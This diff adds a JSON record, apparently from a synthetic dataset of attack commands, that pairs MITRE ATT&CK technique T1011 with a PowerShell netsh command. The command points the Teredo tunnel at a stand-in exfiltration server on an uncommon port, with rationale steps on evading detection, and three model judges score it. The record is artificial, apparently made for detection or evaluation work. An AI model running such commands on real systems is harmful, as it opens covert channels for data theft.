@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
+  "explanation": "Enables Teredo with a custom server and high, uncommon UDP client port to establish an IPv6-over-IPv4 tunnel as an alternate medium for exfiltration, aligning with T1011.",
+  "rationale_steps": [
+    "Configure Teredo to create an IPv6 tunnel over IPv4/UDP, providing a non-primary channel.",
+    "Use a non-standard client port (60445) to evade simple detections.",
+    "Traffic over Teredo can carry exfil data outside normal monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-b376dc3c",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The netsh command is well-formed with valid subcontexts and key=value parameters (type, servername, clientport) and no quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It configures the Teredo client to use a custom server and UDP port, plausibly enabling IPv6-over-IPv4 tunneling consistent with covert signaling/exfiltration, but typically requires administrative privileges and an enabled Teredo service to be effective.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T13:52:30.660306Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface teredo command, using proper parameter names and values with appropriate equals signs for assignment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly configures Teredo tunneling with a custom exfiltration server and non-standard port that would enable covert IPv6-over-IPv4 tunneling for traffic signaling and data exfiltration, aligning perfectly with T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:52:33.845405Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid `netsh` syntax, correct subcommand structure, and proper key-value pair arguments for Teredo configuration.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly employs `netsh` and Teredo configuration with a custom server and port to establish a covert tunnel for exfiltration, directly aligning with T1011's 'protocol mimicry or tunneling' aspect, but it requires administrative privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:52:58.195668Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
